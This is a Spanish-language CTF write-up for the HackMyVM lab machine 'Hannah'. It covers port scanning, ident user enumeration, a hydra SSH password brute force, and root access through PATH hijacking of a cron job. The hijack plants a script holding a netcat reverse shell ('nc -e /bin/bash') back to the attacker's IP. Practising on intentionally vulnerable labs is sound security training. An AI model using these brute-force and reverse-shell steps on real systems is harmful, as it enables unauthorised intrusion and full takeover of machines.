---
layout: post
title: Hannah - Hackmyvm
tags: [ctf, hackmyvm]
---

**Autor**: Sml \\
**Dificultad**: Fácil

![img](/imgs/write-ups/hackmyvm/hannah/hannah.png#center)

## Reconocimiento

Comienzo con una enumeración básica utilizando nmap.

```
sudo nmap -p- 192.168.1.63 
[sudo] contraseña para user: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-05 22:37 UTC
Nmap scan report for 192.168.1.63
Host is up (0.00014s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
113/tcp open  ident
MAC Address: 08:00:27:2A:54:DF (Oracle VirtualBox virtual NIC)
```

### 113 (ident)

Enumero el puerto 113 con [Ident User Enum](https://github.com/pentestmonkey/ident-user-enum) y tras probar con todos los puertos disponibles, solo el puerto 80 ofrece un usuario diferente a root.

```
ident-user-enum git:(master) ./ident-user-enum.pl 192.168.1.63 80
ident-user-enum v1.0 ( http://pentestmonkey.net/tools/ident-user-enum )

192.168.1.63:80 moksha
```

## Explotación

Una vez conocido un usuario, realizo un ataque de fuerza bruta para intentar conseguir su contraseña.

```
hydra -l moksha -P /usr/share/seclists/Passwords/rockyou.txt 192.168.1.63 ssh
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-01-05 22:38:30
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ssh://192.168.1.63:22/
[22][ssh] host: 192.168.1.63   login: moksha   password: h*****
1 of 1 target successfully completed, 1 valid password found
```

Contraseña encontrada!!

## Escalado de privilegios

Utilizo ssh para iniciar sesión en la máquina. Una vez dentro descubro que cada minuto se ejecuta un cronjob en el cual el usuario root crea un fichero en /tmp.

```
moksha@hannah:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/media:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
* * * * * root touch /tmp/enlIghtenment
[...]
```

Tambien se puede ver que tengo permisos de escritura en /media y este directorio se encuentra en el PATH de root.
```
ls -la /
total 68
drwxr-xr-x  18 root root  4096 ene  4 10:47 .
drwxr-xr-x  18 root root  4096 ene  4 10:47 ..
[...]
drwxrwxrwx   3 root root  4096 ene  5 10:52 media
[...]
```

De esta forma, para conseguir acceso como el usuario root realizo un ataque de "path hijacking" dado que no se especifica la ruta completa del comando "touch" y el directorio "/media" se encuentra antes que "/usr/bin" que es donde está "touch".

```
$ touch /media/touch
$ chmod +x /media/touch
$ cat /media/touch 
#!/bin/bash
nc -e /bin/bash 192.168.1.79 1234

$ :)
```

Una vez se ejecute el cronjob, obtengo una conexión como el usuario root.

```
$ nc -lvnp 1234
Connection from 192.168.1.63:60164
root@hannah:~# :)
```

Muchas gracias  **Sml** por esta máquina.
